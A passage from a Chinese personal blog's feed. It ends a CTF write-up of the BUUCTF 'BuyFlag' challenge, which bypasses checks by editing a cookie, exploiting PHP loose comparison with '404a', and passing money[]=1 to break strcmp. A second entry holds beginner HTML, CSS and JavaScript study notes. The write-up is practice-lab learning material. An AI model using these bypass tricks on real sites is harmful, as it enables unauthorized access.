2019]BuyFlag</strong><br><img data-src="/2024/03/06/ctf%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B31/5.jpg" alt="5"><br>首先观察主页面 发现右侧菜单栏通往另一个与flag有关的分页面<br><img data-src="/2024/03/06/ctf%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B31/6.jpg" alt="6"><br>首先是线索<br>(如果想要购买flag 你必须得是CUIT的学生之一 还得回答正确的密码)<br>第一关是 <strong>通过CUIT的学生验证</strong><br>我们通过观察网站的网络数据包与cookie 发现一个名为 <strong>user</strong> 的cookie 值为0<br>尝试将0更改为1 成功通过<br><img data-src="/2024/03/06/ctf%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B31/7.jpg" alt="7"><br>第二关是 <strong>输入正确密码</strong><br><img data-src="/2024/03/06/ctf%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B31/8.jpg" alt="8"><br>这点网站的注释中有相关的代码透露<br>该代码内同样使用了 <strong>弱相等</strong>  需要通过post方式将 <strong>$password</strong> 改为会被整数化为404的字符 我们拟用 <strong>404a</strong> 进行尝试 成功通过<br><img data-src="/2024/03/06/ctf%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B31/9.jpg" alt="9"><br>进入了第三关 <strong>付钱</strong><br>注释中提到过 <strong>post money and password</strong><br>因此投送的数据名应为money<br><img data-src="/2024/03/06/ctf%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B31/10.jpg" alt="10"><br>输入了所需要的100000000元后 却显示数据过长 需要压缩<br>这里有两种方式<br>(1)输入简略的科学计数法 如1e9=1×10的9次方 来使字符压缩<br>(2)利用strcmp函数在判断对象不是字符串时会报错并return0 的特性<br>输入money[]=1 使money变为数组 获取flag<br><img data-src="/2024/03/06/ctf%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B31/11.jpg" alt="11"><br>提交flag 结束!</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>更感觉CTF是一种不同形式的靶机<br>总之我们下次见吧</p></body></html>]]></content>
    
    
    <summary type="html">&lt;p&gt;本次主题为 &lt;strong&gt;[ACTF2020 新生赛]BackupFile&lt;/strong&gt; 与 &lt;strong&gt;[极客大挑战 2019]BuyFlag&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&quot;使用平台&quot;&gt;&lt;a href=&quot;#使用平台&quot; class=&quot;headerlink&quot; title=&quot;使用平台&quot;&gt;&lt;/a&gt;使用平台&lt;/h2&gt;&lt;p&gt;chrome&lt;br&gt;&lt;a href=&quot;https://buuoj.cn/&quot;&gt;buuctf&lt;/a&gt;&lt;br&gt;firefox(搭载hackbar)&lt;/p&gt;
&lt;h2 id=&quot;相关知识&quot;&gt;&lt;a href=&quot;#相关知识&quot; class=&quot;headerlink&quot; title=&quot;相关知识&quot;&gt;&lt;/a&gt;相关知识&lt;/h2&gt;&lt;p&gt;备份文件的存在&lt;br&gt;cookie查看&amp;#x2F;修改&lt;br&gt;php数据类型&lt;/p&gt;
&lt;h2 id=&quot;flag获取过程&quot;&gt;&lt;a href=&quot;#flag获取过程&quot; class=&quot;headerlink&quot; title=&quot;flag获取过程&quot;&gt;&lt;/a&gt;flag获取过程&lt;/h2&gt;</summary>
    
    
    
    <category term="学习" scheme="https://www.maonie.top/categories/%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="CTF" scheme="https://www.maonie.top/categories/%E5%AD%A6%E4%B9%A0/CTF/"/>
    
    
    <category term="学习" scheme="https://www.maonie.top/tags/%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="CTF" scheme="https://www.maonie.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>复习time</title>
    <link href="https://www.maonie.top/2024/02/27/%E5%A4%8D%E4%B9%A0time/"/>
    <id>https://www.maonie.top/2024/02/27/%E5%A4%8D%E4%B9%A0time/</id>
    <published>2024-02-27T10:25:52.000Z</published>
    <updated>2024-02-27T11:29:03.067Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><h1 id="高三了进行一个前端（html-css-javascript）的复习"><a href="#高三了进行一个前端（html-css-javascript）的复习" class="headerlink" title="高三了进行一个前端（html+css+javascript）的复习"></a>高三了进行一个前端（html+css+javascript）的复习</h1><h2 id="html"><a href="#html" class="headerlink" title="html"></a>html</h2><blockquote><p>“超文本标记语言（英语：HyperText Markup Language，简称：HTML）是一种用于创建网页的标准标记语言。<br>您可以使用 HTML 来建立自己的 WEB 站点，HTML 运行在浏览器上，由浏览器来解析。”</p></blockquote><p><strong>基础构造</strong></p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">doctype</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>元素名用尖括号包裹<br> 以<code>&lt;元素名&gt;元素内容&lt;/元素名&gt;</code>或<code>&lt;元素名 /&gt;</code>作为一部分组成的代码<br>注释形式为<code>&lt;!--这是一个注释，注释在浏览器中不会显示--&gt;</code></p><h2 id="css"><a href="#css" class="headerlink" title="css"></a>css</h2><blockquote><p>“<strong>CSS</strong> (Cascading Style Sheets，层叠样式表），是一种用来为结构化文档（如 HTML 文档或 XML 应用）添加样式（字体、间距和颜色等）的计算机语言，<strong>CSS</strong> 文件扩展名为 <strong>.css</strong>。<br>通过使用 <strong>CSS</strong> 我们可以大大提升网页开发的工作效率！”</p></blockquote><span id="more"></span><p><strong>基础构造</strong></p><pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">body</span> <span class="token punctuation">{</span>    <span class="token property">background-color</span><span class="token punctuation">:</span>#d0e4fe<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector">h1</span> <span class="token punctuation">{</span>    <span class="token property">color</span><span class="token punctuation">:</span>orange<span class="token punctuation">;</span>    <span class="token property">text-align</span><span class="token punctuation">:</span>center<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector">p</span> <span class="token punctuation">{</span>    <span class="token property">font-family</span><span class="token punctuation">:</span><span class="token string">"Times New Roman"</span><span class="token punctuation">;</span>    <span class="token property">font-size</span><span class="token punctuation">:</span>20px<span class="token punctuation">;</span><span class="token punctuation">}</span>👆在html中直接编译可以使用&lt;style&gt;标签又或者使用 &lt;link rel=<span class="token string">"stylesheet"</span> href=<span class="token string">"style.css"</span>&gt;这样便可以多个网页复用一个css文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>首先声明需要更改的元素 （例如body）<br>然后用大括号 里面加上属性 随后加冒号 声明属性的值 随后以分号收尾<br>除了直接更改元素 还可以使用选择器</p><pre class="line-numbers language-css+html" data-language="css+html"><code class="language-css+html">#para1{text-align:center;color:red;} 👆CSS 中id 选择器以 "#" 来定义&lt;p id="para1"&gt;Hello World!&lt;/p&gt;👆这个段落就会受到居中和红色字体的影响<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">.center</span><span class="token punctuation">{</span><span class="token property">text-align</span><span class="token punctuation">:</span>center<span class="token punctuation">;</span><span class="token punctuation">}</span>👆在 CSS 中类选择器以一个点.号显示&lt;h1 class=<span class="token string">"center"</span>&gt;标题居中&lt;/h1&gt;&lt;p class=<span class="token string">"center"</span>&gt;段落居中。&lt;/p&gt; 👆这些元素就会受到居中影响<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">p.center</span><span class="token punctuation">{</span><span class="token property">text-align</span><span class="token punctuation">:</span>center<span class="token punctuation">;</span><span class="token punctuation">}</span>👆在.号前加上元素名 就能限制选择器的范围&lt;h1 class=<span class="token string">"center"</span>&gt;这个标题不受影响&lt;/h1&gt;&lt;p class=<span class="token string">"center"</span>&gt;这个段落居中对齐。&lt;/p&gt; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注释方式是<code>/*这里是注释的内容*/</code></p><h2 id="javascript"><a href="#javascript" class="headerlink" title="javascript"></a>javascript</h2><p>还在自学 打点草稿上来 1.javascript对大小写敏感<br>2.输出方式很多<br>(1)浏览器的f12 - 控制台中测试<br>(2)html文件<code>&lt;script&gt;</code>元素之间</p><p>总之先把现在懂的代码列出来吧<br>(1)var 变量名=’变量内容’ //定义变量<br>(2)字符需要加“”或者’‘ 不然被看做变量<br>(3)console.log(“这些文字”) //让该网页的控制台中输出这些文字<br>(4)<code>单行注释 //</code><br>(5)<code>/*多行注释*/</code><br>(6)申明函数（类似于python）<br>    function 函数名称（可选的变量项1，变量项2）{<br>    代码内容<br>    }<br>(7) return x; 输出变量x的值 多用于函数结尾<br>(8) 加在元素的标签内 例如下文中的onclick 点击后通过替换demo中的内容来实现报时<br><code>&lt;button onclick="getElementById('demo').innerHTML=Date()"&gt;现在的时间是?&lt;/button&gt;</code><br><code>&lt;p id="demo"&gt;&lt;/p&gt;</code><br><a href="https://www.runoob.com/jsref/dom-obj-event.html">https://www.runoob.com/jsref/dom-obj-event.html</a><br>至于事件可以看这里👆</p><p>(9)至于元素和.后边的相互关系目前未知<br>(10)输出方式很多<br>使用document.write()将内容写入到html中<br>使用console.log()在f12里的console生成信息<br>使用window.alert()弹出警告框<br>用id属性标识某个元素 然后使用document.getElementById(“demo”).innerHTML=”想要加入的内容”<br><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Element/innerHTML">https://developer.mozilla.org/zh-CN/docs/Web/API/Element/innerHTML</a><br>很酷<br>vue.js<br>(11)变量在赋值之前都是undefined</p></body></html>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;高三了进行一个前端（html-css-javascript）的复习&quot;&gt;&lt;a href=&quot;#高三了进行一个前端（html-css-javascript）的复习&quot; class=&quot;headerlink&quot; title=&quot;高三了进行一个前端（html+css+javascript）的复习&quot;&gt;&lt;/a&gt;高三了进行一个前端（html+css+javascript）的复习&lt;/h1&gt;&lt;h2 id=&quot;html&quot;&gt;&lt;a href=&quot;#html&quot; class=&quot;headerlink&quot; title=&quot;html&quot;&gt;&lt;/a&gt;html&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;“超文本标记语言（英语：HyperText Markup Language，简称：HTML）是一种用于创建网页的标准标记语言。&lt;br&gt;您可以使用 HTML 来建立自己的 WEB 站点，HTML 运行在浏览器上，由浏览器来解析。”&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;基础构造&lt;/strong&gt;&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-markup&quot; data-language=&quot;markup&quot;&gt;&lt;code class=&quot;language-markup&quot;&gt;&lt;span class=&quot;token doctype&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;!&lt;/span&gt;&lt;span class=&quot;token doctype-tag&quot;&gt;doctype&lt;/span&gt; &lt;span class=&quot;token name&quot;&gt;html&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;html&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
    &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;head&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
    &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;head&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
    	&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;body&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
    	&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;body&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;html&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;元素名用尖括号包裹&lt;br&gt; 以&lt;code&gt;&amp;lt;元素名&amp;gt;元素内容&amp;lt;/元素名&amp;gt;&lt;/code&gt;或&lt;code&gt;&amp;lt;元素名 /&amp;gt;&lt;/code&gt;作为一部分组成的代码&lt;br&gt;注释形式为&lt;code&gt;&amp;lt;!--这是一个注释，注释在浏览器中不会显示--&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&quot;css&quot;&gt;&lt;a href=&quot;#css&quot; class=&quot;headerlink&quot; title=&quot;css&quot;&gt;&lt;/a&gt;css&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;“&lt;strong&gt;CSS&lt;/strong&gt; (Cascading Style Sheets，层叠样式表），是一种用来为结构化文档（如 HTML 文档或 XML 应用）添加样式（字体、间距和颜色等）的计算机语言，&lt;strong&gt;CSS&lt;/strong&gt; 文件扩展名为 &lt;strong&gt;.css&lt;/strong&gt;。&lt;br&gt;通过使用 &lt;strong&gt;CSS&lt;/strong&gt; 我们可以大大提升网页开发的工作效率！”&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="学习" scheme="https://www.maonie.top/categories/%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="学习" scheme="https://www.maonie.top/tags/%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
</feed>
